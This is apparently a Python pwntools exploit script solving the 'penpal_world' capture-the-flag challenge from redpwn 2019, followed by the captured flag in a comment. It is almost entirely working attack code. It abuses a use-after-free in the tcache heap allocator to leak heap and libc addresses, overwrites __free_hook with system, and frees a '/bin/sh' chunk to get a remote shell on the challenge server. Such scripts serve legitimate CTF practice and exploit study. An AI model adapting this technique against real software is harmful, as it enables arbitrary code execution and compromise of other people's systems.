from pwn import *
import time


binpath = './penpal_world'
context.binary = binpath
context.terminal = ['tmux', 'split-w', '-h']


elf = ELF(binpath)
libc = elf.libc


gdbscript = '''
gef
b *0x555555554c51
set $table=0x555555756050
'''
# io = gdb.debug([binpath], aslr=False, gdbscript=gdbscript)
io = process(binpath)
io = remote("chall2.2019.redpwn.net", 4010)


def debug(func):
    def wrapper(*args, **kwargs):
        print '{}({}, {})'.format(func.__name__, str(args), str(kwargs))
        return func(*args, **kwargs)
    return wrapper


@debug
def create(en):
    io.recvuntil('4) Read a postcard\n')
    io.sendline('1')

    io.sendline(str(en))


@debug
def edit(en, data):
    io.recvuntil('4) Read a postcard\n')
    io.sendline('2')

    io.sendline(str(en))

    io.recvuntil('Write.\n')
    io.sendline(data)


@debug
def discard(en):
    io.recvuntil('4) Read a postcard\n')
    io.sendline('3')

    io.sendline(str(en))


@debug
def read(en):
    io.recvuntil('4) Read a postcard\n')
    io.sendline('4')

    io.sendline(str(en))

    io.recvuntil('#?\n')
    data = io.recvuntil('O')[:-1]
    return data.rstrip()


create(0)
create(1)

# fake chunk
payload = ''
payload += 'A' * 0x38
payload += p64(0x11)  # size
edit(1, payload)


# Discard multiple times to increase tcache count.
# If we don't increase the count here the following mallocs will decrement the count
# and cause the count to underflow.
# Underflowed count will be much larger than 7, so frees will be linked to fastbins.
for _ in xrange(4):
    discard(1)

data = read(1)
addr_heap = u64(data.ljust(8, '\x00')[:8]) - 0x2b0
print "addr_heap = 0x{:x}".format(addr_heap)

# link to size of 0
create(1)
edit(1, p64(addr_heap + 0x250))

print "consume"
create(1)

# overwrite size
# at the same time point next to second chunk
create(1)
payload = ''
payload += p64(0xdeadbeefdeadbeef)  # pad
payload += p64(0x91)
edit(1, payload)

# free 0x80 chunk
for i in xrange(8):
    discard(0)

data = read(0)
addr_libc = u64(data.ljust(8, '\x00')) - 0x3ebca0
print "addr_libc = 0x{:x}".format(addr_libc)

create(0)
discard(0)
# link free hook to chunk
edit(0, p64(addr_libc + libc.symbols['__free_hook']))

# consume
create(1)
edit(1, '/bin/sh\x00')

create(0)
edit(0, p64(addr_libc + libc.symbols['system']))

discard(1)

io.interactive()

# flag{0h_n0e5_sW1p3r_d1D_5w!peEEeE}
